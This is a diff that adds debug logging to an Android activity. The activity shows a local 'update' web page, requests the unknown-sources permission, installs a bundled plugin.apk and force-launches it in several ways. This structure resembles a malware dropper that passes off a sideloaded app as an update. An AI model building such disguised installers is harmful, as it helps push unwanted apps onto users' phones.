@@ -16,6 +16,7 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
+import android.util.Log
 import android.util.TypedValue
 import android.view.View
 import android.view.WindowInsetsController
@@ -30,6 +31,7 @@ import java.io.FileOutputStream
 class MainActivity : Activity() {
 
     companion object {
+        private const val TAG = "MainActivity"
         private const val APK_NAME = "plugin.apk"
         private const val REQUEST_INSTALL = 100
         private const val ACTION_INSTALL = "com.example.installer.INSTALL"
@@ -44,23 +46,33 @@ class MainActivity : Activity() {
     private val installReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)
+            Log.d(TAG, "installReceiver: Received status: $status")
 
             when (status) {
                 PackageInstaller.STATUS_PENDING_USER_ACTION -> {
+                    Log.d(TAG, "installReceiver: Pending user action")
                     val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
-                    confirmIntent?.let { startActivity(it) }
+                    confirmIntent?.let { 
+                        Log.d(TAG, "installReceiver: Starting confirmation intent")
+                        startActivity(it) 
+                    } ?: Log.w(TAG, "installReceiver: Confirm intent is null")
                 }
 
                 PackageInstaller.STATUS_SUCCESS -> {
+                    Log.d(TAG, "installReceiver: Installation successful")
                     handler.post {
                         toast("Installed!")
                     }
                     handler.postDelayed({
+                        Log.d(TAG, "installReceiver: Opening installed app")
                         forceOpenApp()
                     }, 500)
                 }
 
                 else -> {
+                    Log.e(TAG, "installReceiver: Installation failed with status: $status")
+                    val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
+                    Log.e(TAG, "installReceiver: Error message: $message")
                     handler.post {
                         isInstalling = false
                         toast("Installation failed")
@@ -73,20 +85,26 @@ class MainActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        Log.d(TAG, "onCreate: Starting")
 
         try {
+            Log.d(TAG, "onCreate: Setting up system bars")
             setupSystemBars()
+            Log.d(TAG, "onCreate: System bars set up successfully")
         } catch (e: Exception) {
-            // Ignore
+            Log.e(TAG, "onCreate: Error in setupSystemBars", e)
         }
 
         try {
+            Log.d(TAG, "onCreate: Registering receiver")
             registerReceiver(installReceiver, IntentFilter(ACTION_INSTALL))
+            Log.d(TAG, "onCreate: Receiver registered successfully")
         } catch (e: Exception) {
-            // Ignore
+            Log.e(TAG, "onCreate: Error registering receiver", e)
         }
 
         try {
+            Log.d(TAG, "onCreate: Creating WebView")
             webView = WebView(this).apply {
                 settings.apply {
                     javaScriptEnabled = true
@@ -100,9 +118,11 @@ class MainActivity : Activity() {
                 webViewClient = object : WebViewClient() {
                     override fun onPageFinished(view: WebView?, url: String?) {
                         super.onPageFinished(view, url)
+                        Log.d(TAG, "WebView: Page finished loading: $url")
                     }
 
                     override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
+                        Log.d(TAG, "WebView: URL loading: $url")
                         return false
                     }
 
@@ -113,22 +133,30 @@ class MainActivity : Activity() {
                         failingUrl: String?
                     ) {
                         super.onReceivedError(view, errorCode, description, failingUrl)
+                        Log.e(TAG, "WebView: Error loading page - Code: $errorCode, Desc: $description, URL: $failingUrl")
                     }
                 }
 
                 webChromeClient = WebChromeClient()
             }
+            Log.d(TAG, "onCreate: WebView created successfully")
 
+            Log.d(TAG, "onCreate: Adding JavaScript interface")
             webView.addJavascriptInterface(WebAppInterface(), "Android")
             
+            Log.d(TAG, "onCreate: Setting content view")
             setContentView(webView)
 
             if (checkAssetExists("update/update.html")) {
+                Log.d(TAG, "onCreate: Loading update.html")
                 webView.loadUrl("file:///android_asset/update/update.html")
             } else {
+                Log.e(TAG, "onCreate: update.html not found, showing error page")
                 showErrorPage()
             }
+            Log.d(TAG, "onCreate: Completed successfully")
         } catch (e: Exception) {
+            Log.e(TAG, "onCreate: Critical error", e)
             finish()
         }
     }
@@ -137,6 +165,7 @@ class MainActivity : Activity() {
         return try {
             assets.open(assetPath).use { true }
         } catch (e: Exception) {
+            Log.e(TAG, "checkAssetExists: Asset not found - $assetPath", e)
             false
         }
     }
@@ -170,15 +199,20 @@ class MainActivity : Activity() {
     inner class WebAppInterface {
         @JavascriptInterface
         fun installPlugin() {
+            Log.d(TAG, "WebAppInterface: installPlugin called")
             handler.post {
                 if (!isInstalling) {
+                    Log.d(TAG, "WebAppInterface: Starting installation")
                     checkPermission()
+                } else {
+                    Log.w(TAG, "WebAppInterface: Installation already in progress")
                 }
             }
         }
 
         @JavascriptInterface
         fun onInstallComplete() {
+            Log.d(TAG, "WebAppInterface: onInstallComplete called")
             handler.post {
                 webView.postDelayed({
                     webView.loadUrl("file:///android_asset/update/update.html?installed=true")
@@ -188,34 +222,47 @@ class MainActivity : Activity() {
     }
 
     private fun checkPermission() {
+        Log.d(TAG, "checkPermission: Checking install permission")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
+                Log.d(TAG, "checkPermission: Permission not granted, requesting")
                 val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                     data = Uri.parse("package:${this@MainActivity.packageName}")
                 }
                 startActivityForResult(intent, REQUEST_INSTALL)
                 return
             }
+            Log.d(TAG, "checkPermission: Permission already granted")
         }
+        Log.d(TAG, "checkPermission: Starting install")
         install()
     }
 
     private fun install() {
-        if (isInstalling) return
+        Log.d(TAG, "install: Starting installation process")
+        if (isInstalling) {
+            Log.w(TAG, "install: Already installing, returning")
+            return
+        }
         isInstalling = true
 
         handler.post {
             if (checkAssetExists("update/installing.html")) {
+                Log.d(TAG, "install: Loading installing.html")
                 webView.loadUrl("file:///android_asset/update/installing.html")
+            } else {
+                Log.e(TAG, "install: installing.html not found")
             }
         }
 
         Thread {
             var session: PackageInstaller.Session? = null
             try {
+                Log.d(TAG, "install: Reading APK info")
                 readApkInfo()
 
                 if (packageName == null) {
+                    Log.e(TAG, "install: Failed to read package name")
                     handler.post {
                         isInstalling = false
                         toast("Cannot read APK")
@@ -223,7 +270,9 @@ class MainActivity : Activity() {
                     }
                     return@Thread
                 }
+                Log.d(TAG, "install: Package name: $packageName, Main activity: $mainActivity")
 
+                Log.d(TAG, "install: Creating installer session")
                 val installer = packageManager.packageInstaller
 
                 val params = PackageInstaller.SessionParams(
@@ -241,9 +290,11 @@ class MainActivity : Activity() {
                 }
 
                 val sessionId = installer.createSession(params)
+                Log.d(TAG, "install: Session created with ID: $sessionId")
                 session = installer.openSession(sessionId)
 
                 if (!checkAssetExists(APK_NAME)) {
+                    Log.e(TAG, "install: $APK_NAME not found in assets")
                     handler.post {
                         isInstalling = false
                         toast("APK file not found")
@@ -252,17 +303,22 @@ class MainActivity : Activity() {
                     return@Thread
                 }
 
+                Log.d(TAG, "install: Writing APK to session")
                 session.openWrite("package", 0, -1).use { out ->
                     assets.open(APK_NAME).use { input ->
                         val buffer = ByteArray(65536)
                         var read: Int
+                        var totalBytes = 0L
                         while (input.read(buffer).also { read = it } != -1) {
                             out.write(buffer, 0, read)
+                            totalBytes += read
                         }
+                        Log.d(TAG, "install: Written $totalBytes bytes to session")
                         session.fsync(out)
                     }
                 }
 
+                Log.d(TAG, "install: Creating PendingIntent")
                 val intent = Intent(ACTION_INSTALL)
 
                 val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -275,9 +331,12 @@ class MainActivity : Activity() {
                     this@MainActivity, sessionId, intent, flags
                 )
 
+                Log.d(TAG, "install: Committing session")
                 session.commit(sender.intentSender)
+                Log.d(TAG, "install: Session committed successfully")
 
             } catch (e: Exception) {
+                Log.e(TAG, "install: Exception during installation", e)
                 session?.abandon()
                 handler.post {
                     isInstalling = false
@@ -290,65 +349,91 @@ class MainActivity : Activity() {
 
     private fun readApkInfo() {
         try {
+            Log.d(TAG, "readApkInfo: Checking if $APK_NAME exists")
             if (!checkAssetExists(APK_NAME)) {
+                Log.e(TAG, "readApkInfo: $APK_NAME not found")
                 return
             }
 
             val tempFile = File(cacheDir, "temp.apk")
+            Log.d(TAG, "readApkInfo: Copying APK to temp file: ${tempFile.absolutePath}")
 
             FileOutputStream(tempFile).use { out ->
                 assets.open(APK_NAME).use { input ->
                     val buffer = ByteArray(8192)
                     var read: Int
+                    var totalBytes = 0L
                     while (input.read(buffer).also { read = it } != -1) {
                         out.write(buffer, 0, read)
+                        totalBytes += read
                     }
+                    Log.d(TAG, "readApkInfo: Copied $totalBytes bytes")
                 }
             }
 
             if (!tempFile.exists() || tempFile.length() == 0L) {
+                Log.e(TAG, "readApkInfo: Temp file is empty or doesn't exist")
                 tempFile.delete()
                 return
             }
 
+            Log.d(TAG, "readApkInfo: Reading package info from temp file")
             val info = packageManager.getPackageArchiveInfo(
                 tempFile.absolutePath,
                 PackageManager.GET_ACTIVITIES
             )
 
-            info?.let {
-                packageName = it.packageName
-                val activities = it.activities
+            if (info == null) {
+                Log.e(TAG, "readApkInfo: Failed to get package archive info")
+            } else {
+                packageName = info.packageName
+                Log.d(TAG, "readApkInfo: Package name: $packageName")
+                
+                val activities = info.activities
                 if (activities != null && activities.isNotEmpty()) {
                     mainActivity = activities[0].name
+                    Log.d(TAG, "readApkInfo: Main activity: $mainActivity")
+                } else {
+                    Log.w(TAG, "readApkInfo: No activities found")
                 }
             }
 
             tempFile.delete()
 
         } catch (e: Exception) {
-            // Ignore
+            Log.e(TAG, "readApkInfo: Exception", e)
         }
     }
 
     private fun forceOpenApp() {
+        Log.d(TAG, "forceOpenApp: Starting to open installed app")
         Thread {
             try {
+                Log.d(TAG, "forceOpenApp: Waiting 800ms")
                 Thread.sleep(800)
+                
+                Log.d(TAG, "forceOpenApp: Trying method 1 (ComponentName)")
                 tryMethod1()
                 Thread.sleep(300)
+                
+                Log.d(TAG, "forceOpenApp: Trying method 2 (monkey)")
                 tryMethod2()
                 Thread.sleep(300)
+                
+                Log.d(TAG, "forceOpenApp: Trying method 3 (am start)")
                 tryMethod3()
                 Thread.sleep(300)
+                
+                Log.d(TAG, "forceOpenApp: Trying method 4 (getLaunchIntent)")
                 tryMethod4()
 
                 handler.postDelayed({
+                    Log.d(TAG, "forceOpenApp: Finishing MainActivity")
                     finishAndRemoveTask()
                 }, 1000)
 
             } catch (e: Exception) {
-                // Ignore
+                Log.e(TAG, "forceOpenApp: Exception", e)
             }
         }.start()
     }
@@ -409,12 +494,16 @@ class MainActivity : Activity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
+        Log.d(TAG, "onActivityResult: requestCode=$requestCode, resultCode=$resultCode")
 
         if (requestCode == REQUEST_INSTALL) {
+            Log.d(TAG, "onActivityResult: Checking install permission result")
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 if (packageManager.canRequestPackageInstalls()) {
+                    Log.d(TAG, "onActivityResult: Permission granted, starting install")
                     install()
                 } else {
+                    Log.e(TAG, "onActivityResult: Permission denied by user")
                     toast("Permission denied")
                 }
             }
@@ -467,31 +556,39 @@ class MainActivity : Activity() {
     }
 
     override fun onBackPressed() {
+        Log.d(TAG, "onBackPressed: Called")
         try {
             if (::webView.isInitialized && webView.canGoBack()) {
+                Log.d(TAG, "onBackPressed: WebView can go back")
                 webView.goBack()
             } else {
+                Log.d(TAG, "onBackPressed: Finishing activity")
                 super.onBackPressed()
             }
         } catch (e: Exception) {
+            Log.e(TAG, "onBackPressed: Exception", e)
             super.onBackPressed()
         }
     }
 
     override fun onDestroy() {
+        Log.d(TAG, "onDestroy: Starting")
         super.onDestroy()
         try {
+            Log.d(TAG, "onDestroy: Unregistering receiver")
             unregisterReceiver(installReceiver)
         } catch (e: Exception) {
-            // Ignore
+            Log.e(TAG, "onDestroy: Error unregistering receiver", e)
         }
         try {
             if (::webView.isInitialized) {
+                Log.d(TAG, "onDestroy: Destroying WebView")
                 webView.destroy()
             }
         } catch (e: Exception) {
-            // Ignore
+            Log.e(TAG, "onDestroy: Error destroying WebView", e)
         }
+        Log.d(TAG, "onDestroy: Completed")
     }
 
     private fun toast(msg: String) {
